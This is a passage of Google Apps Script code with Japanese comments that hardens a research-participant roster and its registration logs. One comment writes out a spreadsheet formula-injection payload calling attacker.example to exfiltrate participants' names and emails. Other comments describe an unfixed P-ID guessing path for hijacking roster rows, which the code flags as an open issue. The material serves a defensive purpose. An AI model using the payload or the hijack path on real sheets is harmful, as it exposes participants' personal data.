        conflict: true,
        pid: String(rows[emailHits[0] - 1][0]).trim().toUpperCase(),
        row: emailHits[0],
        rows: emailHits,
        reason: "dup-email-in-roster",
      };
    }
    if (emailHits.length === 1) {
      i = emailHits[0] - 1;
      rowPid = String(rows[i][0]).trim().toUpperCase();
      // ⚠️★★ **A 列の値をそのまま P-ID として返さない**（Codex 指摘・2026-08-28）。
      //   ★ 空なら後段が採番して埋める（正当な経路）。
      //   ⚠️ 空でないのに `P<数字>` でないなら、見出し行・手入力ミス・別の記法である。
      //     → ★ その値で受付メールを送ると、被験者は**存在しない ID**を信じて入力する。
      //     ⚠️ 自動で直すと本当の ID を上書きしうるので、**研究者に判断させる**。
      //   ★ 2026-09-03 追記: ⚠️ **採番が 3 回とも譲って残った `⏳O1-` の行**もここに来る
      //     （`o1AllocatePidRow_`）。→ ★ 研究者が A 列を埋めれば次の提出で通る。
      if (rowPid && !o1IsValidPid_(rowPid)) {
        return { conflict: true, pid: rowPid, row: i + 1, reason: "invalid-pid-in-roster" };
      }
      return { pid: rowPid, row: i + 1 };
    }
  }

  // 2. ★ 申告された P-ID（⚠️ 検証つき）
  if (pid) {
    for (i = 0; i < rows.length; i++) {
      rowPid = String(rows[i][0]).trim().toUpperCase();
      if (rowPid !== pid) continue;
      rowEmail = String(rows[i][2]).trim().toLowerCase();
      if (!rowEmail) {
        // ⚠️★★★ **メールが空なだけでは採用しない**（2026-09-03・G1 から移植）。
        //
        //   ★ 実測された乗っ取り経路: `o1AssignParticipantId_()` 系は `appendRow([newPid])` で
        //     **氏名もメールも空の行**を作る。⚠️ 研究者が手入力するまでの間、その P-ID を
        //     申告した**誰でも**この分岐を通り、その ID を受け取り、**自分のメールがその行に
        //     書き込まれ**、受付メールが届く。
        //   ⚠️ P-ID は連番・フォーム URL は配布済み・`setCollectEmail(false)` なので Google 認証も
        //     無い → ★ **総当たりで当たる**。
        //   ⚠️★★ しかも **ロスターは Phase1 / G1 / O1 で共用**なので、被害は O1 に閉じない。
        //
        // ★ そこで **氏名が入っている行だけ**採用する:
        //   - 研究者が「氏名を先に入れた行」を埋めるのは**正当な経路**なので通す
        //   - ⚠️ 裸の行（氏名も空）は **conflict** にして研究者に判断させる
        //   ★ 安全側に倒れる: 誤って止めても研究者が確認して再提出してもらえばよい。
        //
        // ⚠️★★★ **これは G1 (`Form_G1/GSE_G1_Form_Builder.gs` の `bare-row-claim`) の移植である。**
        //   ★ 移植にあたり**列構成を読み比べて**確認した: `O1_ROSTER_HEAD` は
        //   `["P-ID", "氏名/ニックネーム", "メール", "OS"]` で G1 と同じ並びであり、
        //   `rows[i][1]` が氏名・`rows[i][2]` がメールで一致する。
        //   ⚠️ 列がズレたまま移植すると**氏名欄でないものを氏名として読む**ので、
        //   ★ `O1_ROSTER_HEAD` を変えるときはこの分岐も一緒に見直すこと。
        var rowName = String(rows[i][1] == null ? "" : rows[i][1]).trim();
        if (!rowName) {
          return { conflict: true, pid: rowPid, row: i + 1, reason: "bare-row-claim" };
        }
        // ⚠️★★★ **起票 T-28（未対応・2026-09-03 に security-checker が指摘）**
        //   ★ ここは **`bare-row-claim` が塞いだ穴の「隣」**である。
        //   ⚠️ 塞いだのは「氏名も**メールも**空の行」だけで、
        //     ★ **氏名だけ入っていてメールが空の行**（＝ 研究者が先に用意した正当な行）は
        //     **申告された P-ID だけで取れてしまう**。
        //   ⚠️ P-ID は連番（`最大値 + 1`）・フォーム URL は配布済み・`setCollectEmail(false)`
        //     ＝ 認証なし → ★ `P016`, `P017`, … と順に申告するだけで当たりうる。
        //     当たると下の `:2262` 付近が**提出者のメールをその行に書き込み**、受付メールが届く。
        //   ⚠️ そうなると本人の削除要求で 2 人ぶんが 1 つの P-ID に混ざる（同意文書 §4-3 が履行不能）。
        //   ★ 今回は**直していない** —— ⚠️ 直すと「氏名を先に入れておく」という
        //     研究者の正当な運用（★ この分岐が意図的に許している）を壊すため、
        //     **運用の決めごと**（引換コードを持たせるか / 常に研究者判断へ回すか）が先に要る。
        //   → ★ `.steering/20260903-o1-remaining-highs/decisions.md` 判断 8 に記録。
        return { pid: rowPid, row: i + 1 }; // ★ 氏名がある = 研究者が用意した行
      }
      // ⚠️★★★ 別人のメールが入っている行を名乗っている。
      return { conflict: true, pid: rowPid, row: i + 1, reason: "email-mismatch" };
    }
  }

  return null;
}

/**
 * ★ P-ID の形式（`P` ＋ 数字）。⚠️ **採番規則と同じ形**であること
 * （`o1NextParticipantId_` が `^P(\d+)$` で読むので、そこと食い違わせない）。
 */
function o1IsValidPid_(v) {
  return /^P\d+$/.test(String(v == null ? "" : v).trim().toUpperCase());
}

/** ログに実アドレスを残さない (data-privacy)。 */
function o1MaskEmail_(email) {
  var s = String(email);
  var at = s.indexOf("@");
  if (at <= 1) return "***";
  return s.charAt(0) + "***" + s.substring(at);
}

/**
 * ⚠️★★★ **ロスターを触る操作は必ずこれで包む。**
 *
 * ★ 採番は「読んで最大値を出す → 書く」なので、**包まないと同時実行で同じ番号が 2 人に出る**。
 * ⚠️ かつて `onO1ConsentSubmit` だけがロックを取り、`assignO1ParticipantId`（研究者の手動採番）は
 *   その**外側**で走っていた。★ フォーム提出と手動採番が重なると衝突する
 *   (code-reviewer 指摘・2026-08-28)。→ ★ 両方をここへ通す。
 *
 * @return {*} `fn()` の戻り値。⚠️ ロックを取れなければ `null`（★ 呼び出し側は中止すること）。
 */
function o1WithRosterLock_(fn) {
  var lock = LockService.getScriptLock();
  try {
    lock.waitLock(30000);
  } catch (lockErr) {
    Logger.log("❌ ロスターのロックを取得できませんでした（★ 何も書いていません）: " + lockErr);
    return null;
  }
  try {
    return fn();
  } finally {
    lock.releaseLock();
  }
}

// ============================================================
// ⚠️★★★ ロスターの「形」を確かめる (★ 段 4・起票 T-23)
// ============================================================
// ★ 拒否リスト `o1IsKnownWrongRoster_` は **既知の 1 枚**しか弾けない。
//   ⚠️ 「参加者ロスター」タブを持つ**新しいシート**を指すと素通りし、
//     **P001 から採番して実在の P-ID と衝突する**（★ 別人のデータが 1 つの ID に混ざる）。
//   → ★ 「本物のロスターの形をしているか」を機械で見る。
//
// ⚠️★★ **14 列すべての一致は要求しない。** ★ 要求すると、ロスターに列を 1 つ足しただけで
//   O1 の登録が止まる（＝ fail-closed が過剰に効く）。
//   → ★ **O1 が実際に読み書きする先頭 4 列だけ**を守る。
//   ⚠️ 14 列の完全一致は `o1_form_builder_test.cjs` が
//     `Form_Phase1/GSE_Phase1_Form_Builder.gs` の `ROSTER_HEADER` と照合している
//     （★ 2 か所に同じ定数を持つので、ずれたらテストが赤になる）。
var O1_ROSTER_HEAD = ["P-ID", "氏名/ニックネーム", "メール", "OS"];

/** 見出し行を探す範囲 (★ 実物は行 1 が機密バナー・行 2 が見出し)。 */
var O1_ROSTER_HEADER_SCAN_ROWS = 10;

/**
 * ★ ロスターの形を検査する。問題があれば**理由の文字列**、無ければ空文字を返す。
 * ⚠️ 「開けたから正しい」ではない。★ 中身の形まで見る。
 */
function o1RosterShapeProblem_(sheet) {
  var last = sheet.getLastRow();
  if (last < 1) {
    return "シートが空です（⚠️ 新規に作ったシートを指していませんか）";
  }
  if (sheet.getMaxColumns() < O1_ROSTER_HEAD.length) {
    return "列が " + O1_ROSTER_HEAD.length + " 列に足りません（⚠️ 参加者ロスターの形ではありません）";
  }
  var scan = Math.min(last, O1_ROSTER_HEADER_SCAN_ROWS);
  var head = sheet.getRange(1, 1, scan, O1_ROSTER_HEAD.length).getValues();
  var headerRow = -1;
  for (var i = 0; i < head.length; i++) {
    if (String(head[i][0]).trim() === O1_ROSTER_HEAD[0]) {
      headerRow = i;
      break;
    }
  }
  if (headerRow < 0) {
    return (
      "見出し行が先頭 " + scan + " 行に見つかりません（★ A 列が「" + O1_ROSTER_HEAD[0] + "」の行）"
    );
  }
  for (var c = 0; c < O1_ROSTER_HEAD.length; c++) {
    var actual = String(head[headerRow][c]).trim();
    if (actual !== O1_ROSTER_HEAD[c]) {
      // ⚠️ セルの中身を**丸ごとログへ出さない**（security-checker LOW・2026-08-29）。
      //   ★ 実行ログは削除台帳 A-10 の対象である。→ 先頭 20 文字だけにする。
      return (
        "見出しの " + (c + 1) + " 列目が「" + actual.slice(0, 20) + "」です（★「" +
        O1_ROSTER_HEAD[c] + "」のはず）"
      );
    }
  }
  // ★ **データ行が 1 つも無いロスターは採番元ではない**（⚠️ 新規シートはここで落ちる）。
  var col = sheet.getRange(1, 1, last, 1).getValues();
  for (var r = 0; r < col.length; r++) {
    if (o1IsValidPid_(String(col[r][0]).trim().toUpperCase())) return "";
  }
  // ⚠️★ 原因は 2 つありうる（cross-review 指摘・2026-08-29）。★ **両方を書く** ——
  //   片方だけ書くと、⚠️ 正当に空なだけのロスターを「シートの取り違え」と誤診断する。
  return (
    "P-ID の行が 1 つもありません（⚠️ 新規に作った空のロスターを指していませんか / " +
    "★ 移行直後などで**正当に 0 件**なら、先に 1 人を手で登録してください）"
  );
}

/**
 * ⚠️★★★ **ロスターへ書く値を数式にしない** (security-checker HIGH・2026-08-29)。
 *
 * ★ Apps Script の `appendRow` / `setValue` は **先頭が `=` の文字列を数式として格納する**。
 * ⚠️ 氏名欄は**被験者の自由記入**で、★ フォーム URL は配られ、`setCollectEmail(false)` なので
 *   Google 認証も要求していない。→ 誰でも次を提出できる:
 *
 *     =IMPORTDATA("https://attacker.example/x?d=" & TEXTJOIN(",", 1, B2:C200))
 *
 * ⚠️★★★ **研究者がロスターを開いた瞬間**に Sheets が URL を取りに行き、
 *   **Phase1 / G1 / O1 で共用している全参加者の氏名とメール**が外部へ出る
 *   （★ クリックは要らない。`=IMAGE(...)` も同型）。
 *   ⚠️ 流出先はまさに `docs/o1-deletion-ledger.md` §5b の 1 番＝**対応表そのもの**である。
 *
 * ★ 先頭に `'` を付けると Sheets は「文字列」の印として扱い、⚠️ **セルの値には残らない**
 *   （＝ 研究者が見る表示は変わらない）。
 * ⚠️ 受け口の `sanitizeName_` は**ファイル名用**であって、ロスター書き込みには効いていなかった。
 */
function o1PlainText_(v) {
  var s = String(v === null || v === undefined ? "" : v);
  return /^[=+\-@\t\r]/.test(s) ? "'" + s : s;
}

/**
 * ★ ロスターの形を**読み取りだけ**で確かめる (起票 T-23 の実物確認)。
 *
 * ⚠️★★★ **配備したら必ず 1 度実行すること。**
 *   ★ この検査は fail-closed なので、⚠️ 実物と食い違っていると
 *     **最初の被験者の登録で初めて発動する**（＝ 被験者を待たせて気づく）。
 *   ★ `checkO1FormConfig()` は**設定しか見ない**ので、ロスターの中身までは確かめられない。
 *
 * ⚠️ **PII を出さない**（★ 出すのは行数と判定だけ）。
 */
function checkO1RosterShape() {
  var rosterSheetId = o1Config_().rosterSheetId;
  if (!rosterSheetId) {
    Logger.log("❌ スクリプト プロパティ PHASE1_MGMT_SHEET_ID が空です。");
    return;
  }
  // ⚠️★★★ **拒否リストをここでも見る**（security-checker MEDIUM・2026-08-29）。
  //   ★ 旧シート（`12T8WU4D…`）は**同じ見出しと P-ID の行を持つ**ので、
  //     ⚠️ 形の検査だけでは「✅ 正しい」と言ってしまう。
  if (o1IsKnownWrongRoster_(rosterSheetId)) {
    Logger.log("⛔⚠️★★★ **古いほうの管理シート**を指しています（★ 形が合っていても中身が違う）。");
    Logger.log("   ★「参加者ロスター」タブに P010 以降が入っているほうが正です。");
    return;
  }
  var sheet = SpreadsheetApp.openById(rosterSheetId).getSheetByName("参加者ロスター");
  if (!sheet) {
    Logger.log("❌ 「参加者ロスター」タブがありません。★ ID を確認してください。");
    return;
  }
  var problem = o1RosterShapeProblem_(sheet);
  if (problem) {
    Logger.log(
      "⛔⚠️★★★ ロスターの形が違います: " + problem + "\n" +
        "   ★ このままだと**登録は fail-closed で止まります**（⚠️ 被験者は P-ID を受け取れません）。\n" +
        "   ★ 期待する見出し（1〜4 列目）: " + O1_ROSTER_HEAD.join(" / ")
    );
    return;
  }
  Logger.log("✅ ロスターの形は正しい（★ 見出し 4 列 ＋ P-ID の行あり）。");
  Logger.log("ℹ️ 行数: " + sheet.getLastRow() + "（⚠️ 中身は出しません）");

  // ⚠️★★ **採番の途中で中断した行を報告する**（code-reviewer LOW・2026-09-03）。
  //   ★ `o1AllocatePidRow_` が諦めると `⏳O1-…` の行が残る。
  //   ⚠️ その行は**どの採番にも集計にも混ざらない**（＝ 壊れはしない）が、
  //     ★ **誰も回収しない**ので、放っておくと共用ロスターに溜まる。
  //   → ★ 点検関数が数える（⚠️ 消しはしない。研究者が判断する）。
  var lastRow = sheet.getLastRow();
  var colA = sheet.getRange(1, 1, lastRow, 1).getValues();
  var pending = [];
  for (var q = 0; q < colA.length; q++) {
    if (String(colA[q][0]).indexOf(O1_PID_RESERVE_PREFIX) === 0) pending.push(q + 1);
  }
  if (pending.length) {
    Logger.log(
      "⚠️★★ **採番の途中で中断した行が " + pending.length + " 件あります**（行 " +
        pending.join(" / ") + "）。\n" +
        "   ★ A 列が `" + O1_PID_RESERVE_PREFIX + "…` の行です。⚠️ **どの採番にも集計にも混ざりません**。\n" +
        "   ★ 研究者が A 列に正しい P-ID を入れるか、⚠️ その行ごと消してください\n" +
        "      （★ 消す前に B/C 列に被験者の氏名・メールが入っていないか確認すること）。"
    );
  } else {
    Logger.log("✅ 採番の途中で中断した行（" + O1_PID_RESERVE_PREFIX + "…）はありません。");
  }
}

/**
 * ★ その P-ID がロスターの**どの行にあるか**を返す (起票 T-24)。
 * ⚠️ 読めなかったときは **`null`**（★ 空配列と区別する ——
 * 「1 行も無い」と「確かめられなかった」を同じ値にしない）。
 */
function o1RosterRowsForPid_(pid) {
  var sheet = o1OpenRoster_();
  if (!sheet) return null;
  var last = sheet.getLastRow();
  if (last < 1) return [];
  var want = String(pid).trim().toUpperCase();
  var col = sheet.getRange(1, 1, last, 1).getValues();
  var rows = [];
  for (var i = 0; i < col.length; i++) {
    var raw = String(col[i][0]);
    // ⚠️★★ **ここは意図的に正規化して数える**（★ `o1CountPidRows_` とは目的が違う）。
    //   ★ こちらは「人間には同じ ID に見える行」を見つけて**配るのを止める**のが役目なので、
    //     `p007` / `" P007"` のような表記ゆれも**拾わなければならない**。
    //   ⚠️ 対して `o1CountPidRows_`（採番の読み返し）は**採番側と同じ生値**で数える ——
    //     ★ そこを正規化すると、採番側に見えない行のせいで**候補が永久に進まない**
    //       （2026-09-03 に実測。詳細は `o1CountPidRows_` のコメント）。
    //   → ★ **「同じに見えるか」と「同じ番号か」は別の問い**である。混ぜないこと。
    if (raw.trim().toUpperCase() === want) rows.push({ row: i + 1, raw: raw });
  }
  return rows;
}

/** ★ 行の一覧を「行 3 / 行 7」の形にする（⚠️ PII は含まない）。 */
function o1RowLabels_(hits) {
  var out = [];
  for (var i = 0; i < hits.length; i++) out.push(hits[i].row);
  return out;
}

/** ★ ロスターのシートを開く。⚠️ 無ければ null（★ 呼び出し側が中止する）。 */
function o1OpenRoster_() {
  var o1cfg = o1Config_();
  var rosterSheetId = o1cfg.rosterSheetId;
  // ⚠️★★★ **逆向きの取り違えも塞ぐ**（★ `o1MgmtConfigProblem_` と対にする）。
  //   ★ 採番元に**登録ログの表**を指してしまうと、⚠️ そこには P-ID の行が無いので
  //     `o1RosterShapeProblem_` が止める……はずだが、★ ログが育って
  //     `^P\d+$` に一致する値が C 列でなく A 列に入る形になれば通りうる。
  //   → ★ **ID が一致していたらその手前で止める**（⚠️ 形の検査に頼らない）。
  if (rosterSheetId && o1cfg.mgmtSheetId && rosterSheetId === o1cfg.mgmtSheetId) {
    Logger.log(
      "⛔⚠️★★★ PHASE1_MGMT_SHEET_ID と O1_MGMT_SHEET_ID が **同じ表**を指しています。\n" +
        "   ★ 採番元（参加者ロスター）と登録ログは**別の表**でなければなりません。\n" +
        "   ★ 発番も書き込みもしていません。"
    );
    return null;
  }
  if (!rosterSheetId) {
    Logger.log(
      "❌ スクリプト プロパティ PHASE1_MGMT_SHEET_ID が空です。採番元は Phase1 の参加者ロスターただ 1 つです。\n" +
        "⚠️ O1 側にロスターを作って採番すると、2 か所採番になり必ず衝突します。"
    );
    return null;
  }
  // ⚠️★★★ **拒否リストを書き込み経路でも見る**（security-checker MEDIUM・2026-08-29）。
  //   ★ 従来は `o1ConfigProblems_` だけが見ていたので、⚠️ **トリガ設置のあとに**
  //     スクリプト プロパティを旧 ID へ書き換えられると素通りしていた
  //     （★ `onO1ConsentSubmit` は毎回 `o1Config_()` を読み直す）。
  //   ⚠️ 旧シートは**同じ見出しを持つ**ので、形の検査では止まらない。
  if (o1IsKnownWrongRoster_(rosterSheetId)) {
    Logger.log("⛔⚠️★★★ **古いほうの管理シート**を指しています。★ 発番も書き込みもしていません。");
    Logger.log("   ⚠️ そのまま書くと **実在の P-ID と衝突**します（★ 別人のデータが 1 つの ID に混ざる）。");
    return null;
  }
  var sheet = SpreadsheetApp.openById(rosterSheetId).getSheetByName("参加者ロスター");
  if (!sheet) {
    Logger.log("❌ Phase1 の管理シートに「参加者ロスター」タブがありません。ID を確認してください。");
    return null;
  }
  var problem = o1RosterShapeProblem_(sheet);
  if (problem) {
    Logger.log(
      "⛔⚠️★★★ 指しているシートは**参加者ロスターの形をしていません**: " + problem + "\n" +
        "   ★ 発番も書き込みもしていません（fail-closed）。\n" +
        "   ⚠️ 別のシートを新しく作って指すと、**P001 から採番して実在の P-ID と衝突**します。\n" +
        "   ★ 採番元は Phase1 の参加者ロスターただ 1 つです。"
    );
    return null;
  }
  return sheet;
}

// ============================================================
// ⚠️★★★ O1 固有の運用管理シート＝**提出イベントの追記ログ** (起票 T-25)
// ============================================================
// ★ ここが答えるのは「**誰がいつ登録でき、誰がなぜ弾かれたか**」である。
//   ⚠️ 従来これは `Logger.log` にしか残っておらず、★ 実行ログは
//     `docs/o1-deletion-ledger.md` A-10 の対象で**期限つきで消える**。
//   → ★ 研究者が後から追える形で、**シートに追記**する。
//
// ⚠️★★★ **氏名・メールの列を作らない**（研究者判断 2026-08-29）。
//   ★ マスク済みメールすら置かない —— ⚠️ 削除経路を 2 か所から 3 か所に増やすと、
//     ★ どれか 1 つ漏れた時点で同意文書 §7（削除の申し出）が**履行不能**になる。
//   ★ 実名↔P-ID の対応表は Phase1 ロスターただ 1 か所である（台帳 §5b）。
//
// ⚠️★★ **このシートから採番しない。** ★ 採番元は `PHASE1_MGMT_SHEET_ID` ただ 1 つ。
//   → ⚠️ 取り違えを機械で塞ぐ: `o1MgmtConfigProblem_`（ID の比較）＋
//     `o1OpenMgmtLog_`（★ 「参加者ロスター」タブを持つ表なら**書かずに止まる**）。

// ⚠️★★★ **タブを 2 枚に分ける**（security-checker HIGH・2026-09-03）。
//   ★ 分けない設計だと、⚠️ **第三者が監査証跡を遠隔から黙って止められる**:
//     1. フォーム URL は配布済みで `setCollectEmail(false)` ＝ **認証が無い**。
//     2. 参加者ID欄に `P` とだけ入れると、⚠️ フォーム側の検証は通るのに
//        サーバ側 `o1IsValidPid_`（`^P\d+$`）は落ちる
//        → ★ **ロスターに触れないまま `blocked` 行だけが 1 行増える**。何度でも繰り返せる。
//     3. 上限に達した瞬間、⚠️ **正規の登録の記録まで一切追記されなくなる**。
//   → ★ **却下は別タブ・別枠**にする。⚠️ 却下タブが埋まっても登録タブは書ける。
var O1_MGMT_TAB = "O1 登録ログ"; // ★ result = ok / partial（★ 守るべきほうの記録）
var O1_MGMT_REJECT_TAB = "O1 却下ログ"; // ⚠️ result = blocked（★ 攻撃者が伸ばせる側）
/** ⚠️★★★ **氏名・メールの列は無い**（★ 増やすときも足さないこと）。 */
var O1_MGMT_HEAD = ["記録日時", "種別", "P-ID", "結果", "理由", "備考"];
var O1_MGMT_BANNER =
  "⚠ O1 の登録イベントの追記ログ（研究者のみ）。★ 氏名・メールは持ちません（削除経路を増やさないため）。";
var O1_MGMT_REJECT_BANNER =
  "⚠ O1 で**弾いた**提出の追記ログ（研究者のみ）。★ 第三者が伸ばせるので、登録ログとは枠を分けています。";

/**
 * ★ 追記の上限。⚠️ 超えたら**書くのをやめて警告する**（★ 消さない = append-only を守る）。
 *
 * ⚠️★★ G1 の `applyRunValidation_`（`Form_G1/GSE_G1_Form_Builder.gs:1615`）のような
 *   **行数を固定した入力規則をこのタブに付けない**。★ あちらは 100 行で足りる前提
 *   （逐語「100 行で足りる（G1 の被験者は 2 桁）」）だが、⚠️ 追記ログは前提が違う ——
 *   ★ 規則を 100 行だけ貼ると **101 行目以降が黙って規則なし**になる。
 */
var O1_MGMT_MAX_ROWS = 5000;
/** ⚠️ 却下側は**低め**にする（★ 攻撃者が伸ばせる側なので、早く気づきたい）。 */
var O1_MGMT_REJECT_MAX_ROWS = 2000;

/**
 * ★ 管理シートの **ID だけ**を見て問題を返す（⚠️ 表は開かない）。空文字なら問題なし。
 * ⚠️ 表を開く検査は `o1OpenMgmtLog_` にある（★ `o1ConfigProblems_` は設定しか見ない設計）。
 */
function o1MgmtConfigProblem_(cfg) {
  var id = cfg.mgmtSheetId;
  if (!id) {
    return (
      "スクリプト プロパティ O1_MGMT_SHEET_ID が空です" +
      "（★ O1 の登録ログ。⚠️ 配布**後**に作ると、それ以前の提出分は遡って埋まりません）"
    );
  }
  // ⚠️★★★ **ロスターと同じ ID を指させない。**
  //   ★ 同じ表にすると、⚠️ 追記ログの行が**参加者ロスターの行として読まれうる**うえ、
  //     ⚠️ 「氏名・メールを持たない」という約束が同じ表の中で破れる。
  if (cfg.rosterSheetId && id === cfg.rosterSheetId) {
    return (
      "⚠️★★★ O1_MGMT_SHEET_ID が **PHASE1_MGMT_SHEET_ID と同じ表**を指しています" +
      "（★ 登録ログと参加者ロスターを同じ表にしないでください）。"
    );
  }
  if (o1IsKnownWrongRoster_(id)) {
    return (
      "⚠️★★★ O1_MGMT_SHEET_ID が **古いほうの Phase1 管理シート**を指しています" +
      "（★ 登録ログ用に新しい表を用意してください）。"
    );
  }
  return "";
}

/**
 * ★ 登録ログのタブを開く。⚠️ 問題があれば **null**（★ 呼び出し側が黙って諦める = fail-open）。
 *
 * ⚠️★★★ **ここが「O1 用のロスターを作ってしまった」型を捕まえる唯一の機械**である。
 *   ★ 拒否リスト `o1IsKnownWrongRoster_` は**既知の古いシートしか弾けない**ので、
 *     ⚠️ 新しく作った表は素通りする（★ 起票 T-23 が指していた穴）。
 *   → ★ **「参加者ロスター」タブを持っているなら、それはログの置き場ではない**と判定する。
 *   ⚠️ 書き込みの直前に毎回見る（★ トリガ設置後にプロパティを差し替えられても効く）。
 *
 * @param {boolean} verbose ★ true なら理由をログに出す（⚠️ 提出経路では静かにする）
 * @param {string=} tabOpt ★ 既定は登録タブ。⚠️ 却下は `O1_MGMT_REJECT_TAB` を渡す
 */
function o1OpenMgmtLog_(verbose, tabOpt) {
  var tab = tabOpt || O1_MGMT_TAB;
  var cfg = o1Config_();
  var problem = o1MgmtConfigProblem_(cfg);
  if (problem) {
    if (verbose) Logger.log("❌ " + problem);
    return null;
  }
  var ss;
  try {
    ss = SpreadsheetApp.openById(cfg.mgmtSheetId);
  } catch (e) {
    if (verbose) Logger.log("❌ O1_MGMT_SHEET_ID の表を開けません: " + e);
    return null;
  }
  // ⚠️★★★ ロスターの形をした表をログ置き場にしない（★ 2 か所採番の芽を摘む）。
  if (ss.getSheetByName("参加者ロスター")) {
    Logger.log(
      "⛔⚠️★★★ O1_MGMT_SHEET_ID の表に **「参加者ロスター」タブがあります**。\n" +
        "   ★ これは**採番元のロスター**か、⚠️ **O1 用に作られた 2 つ目のロスター**です。\n" +
        "   ⚠️ 2 か所で採番すると相手の最大値が見えないので**必ず衝突します**。\n" +
        "   ★ 登録ログには**ロスターを持たない別の表**を指してください（★ 何も書いていません）。"
    );
    return null;
  }
  var sheet = ss.getSheetByName(tab);
  if (!sheet) {
    if (verbose) {
      Logger.log(
        "❌ 「" + tab + "」タブがありません。★ buildO1MgmtSheet() を 1 度実行してください。"
      );
    }
    return null;
  }
  return sheet;
}

/**
 * ⚠️★★★ **登録ログに PII を書かせない機械的な歯止め（★ 許可リスト）。**
 *
 * ⚠️★★ 2026-09-03 に**拒否リストから許可リストへ変えた**（security-checker MEDIUM）。
 *   ★ 旧実装は「`@` を含む値を潰す」だった。⚠️ しかし **`@` を含まない PII は素通りする** ——
 *     ★ 日本語の氏名・電話番号・自由記入欄の中身は、どれも `@` を持たない。
 *   → ★ **書いてよい形を先に決める**: 半角英数・空白・`-` `/` `:` `.` `(` `)` `,` と「行」。
 *     ⚠️ 日本語（★ OS の選択肢を除く）が入っていたら潰す。
 *
 * ⚠️ 潰したことは必ずログに残す（★ 黙って直さない）。
 */
var O1_MGMT_NOTE_ALLOWED = /^[-\s\/A-Za-z0-9:().,行]*$/;
/** ★ OS 欄の選択肢だけは日本語を許す（⚠️ `showOtherOption` は使っていない = 自由記入は無い）。 */
var O1_MGMT_NOTE_ALLOWED_WORDS = ["Windows", "Mac", "両方使う", "OS:"];

function o1MgmtSafeCell_(v) {
  var s = String(v === null || v === undefined ? "" : v);
  var probe = s;
  for (var i = 0; i < O1_MGMT_NOTE_ALLOWED_WORDS.length; i++) {
    probe = probe.split(O1_MGMT_NOTE_ALLOWED_WORDS[i]).join("");
  }
  if (!O1_MGMT_NOTE_ALLOWED.test(probe)) {
    Logger.log(
      "⚠️★★ 登録ログに**許可していない形の値**が渡されました。★ 伏せて書きます（PII 混入の疑い）。"
    );
    return "***";
  }
  return o1PlainText_(s);
}

/**
 * ★ 登録イベントを 1 行**追記**する。⚠️ **絶対に例外を投げない**（fail-open）。
 *
 * ⚠️★★★ ここで止まると**被験者の登録が止まる**。★ ログは観測器であってゲートではない。
 *   → ⚠️ シートが無い / 開けない / 上限に達した、いずれでも **`Logger.log` して戻る**。
 *
 * ⚠️★★★ **`blocked` は別タブ・別枠へ書く**（security-checker HIGH・2026-09-03）。
 *   ★ 却下は**認証なしで第三者が伸ばせる**ので、⚠️ 同じ枠に入れると
 *     **正規の登録の記録まで巻き添えで止まる**（= 監査証跡の遠隔抑止）。
 *
 * @param {string} kind   種別（"register" / "assign"。★ 将来 "submit" 等を足せる）
 * @param {string} pid    ★ 分かっているときだけ。⚠️ 不明なら空文字
 * @param {string} result "ok" / "blocked" / "partial"
 * @param {string} reason 理由コード
 * @param {string} note   ⚠️ **PII を書かない**（★ 行番号 / OS / 件数だけ）
 */
function o1LogMgmt_(kind, pid, result, reason, note) {
  try {
    var rejected = result === "blocked";
    var tab = rejected ? O1_MGMT_REJECT_TAB : O1_MGMT_TAB;
    var cap = rejected ? O1_MGMT_REJECT_MAX_ROWS : O1_MGMT_MAX_ROWS;
    var summary = kind + " / " + (pid || "-") + " / " + result + " / " + reason;

    var sheet = o1OpenMgmtLog_(false, tab);
    if (!sheet) {
      Logger.log("⚠️ 登録ログに書けませんでした（★ 登録そのものは続行しています）: " + summary);
      return;
    }
    if (sheet.getLastRow() >= cap) {
      // ⚠️★ **消さない。** ★ append-only の約束を破るくらいなら書くのをやめる。
      Logger.log(
        "⚠️★★ 「" + tab + "」が上限 " + cap + " 行に達したので**追記していません**。\n" +
          "   ★ 研究者が古い行を別タブへ退避してから続けてください（⚠️ 自動では消しません）。\n" +
          "   ★ 今回の記録: " + summary
      );
      // ⚠️★★★ **却下側が埋まったことを、消えない側にも 1 度だけ残す。**
      //   ★ 上の `Logger.log` は削除台帳 A-10 の対象で**期限つきで消える** ——
      //     ⚠️ つまり「黙らされたこと」自体が黙って消える。
      //   ★ 1 度だけにするのは、⚠️ さもないと**却下の連打で登録タブまで埋まる**から
      //     （= 塞いだはずの経路が別の形で戻る）。
      if (rejected) o1NoteRejectLogFull_();
      return;
    }
    sheet.appendRow([
      Utilities.formatDate(new Date(), Session.getScriptTimeZone(), "yyyy-MM-dd HH:mm:ss"),
      o1MgmtSafeCell_(kind),
      o1MgmtSafeCell_(pid),
      o1MgmtSafeCell_(result),
      o1MgmtSafeCell_(reason),
      o1MgmtSafeCell_(note),
    ]);
  } catch (e) {
    // ⚠️★★★ ここで投げると登録が巻き戻る。★ 握りつぶすのは**意図的**である。
    Logger.log("⚠️ 登録ログの追記に失敗しました（★ 登録そのものは続行しています）: " + e);
  }
}

/**
 * ⚠️ 却下ログが埋まったことを、登録ログへ **1 度だけ**記録する。
 * ★ 2 度目以降は何もしない（⚠️ さもないと却下の連打で登録タブが埋まる）。
 */
function o1NoteRejectLogFull_() {
  try {
    var props = PropertiesService.getScriptProperties();
    if (props.getProperty("O1_REJECT_LOG_FULL") === "1") return;
    var main = o1OpenMgmtLog_(false, O1_MGMT_TAB);
    if (!main || main.getLastRow() >= O1_MGMT_MAX_ROWS) return;
    // ⚠️★★ **プロパティの旗だけでは「1 度だけ」を保証できない**（cross-review MEDIUM・2026-09-03）。
    //   ★ `getProperty` → `setProperty` の間に排他が無く、⚠️ `o1LogMgmt_` は
    //     `o1WithRosterLock_` の**外**で呼ばれるので、★ ほぼ同時の提出で複数回書かれうる。
    //   → ★ **実データ側でも見る**: 直前の行が既に `reject-log-full` なら書かない。
    //   ⚠️ これでも完全な原子性は無い（★ 同時実行数ぶんは重複しうる）。
    //     ★ ただし書く内容に PII は無く、⚠️ 重複しても**登録タブが埋まるほどには増えない**
    //       （= 判断 6 で塞いだ経路が戻ることはない）。→ ★ 残る限界として明記する。
    var lastMain = main.getLastRow();
    if (lastMain >= 2) {
      var prev = main.getRange(lastMain, 5, 1, 1).getValues()[0][0];
      if (String(prev) === "reject-log-full") {
        props.setProperty("O1_REJECT_LOG_FULL", "1");
        return;
      }
    }
    main.appendRow([
      Utilities.formatDate(new Date(), Session.getScriptTimeZone(), "yyyy-MM-dd HH:mm:ss"),
      "system",
      "",
      "partial",
      "reject-log-full",
      "cap " + O1_MGMT_REJECT_MAX_ROWS,
    ]);
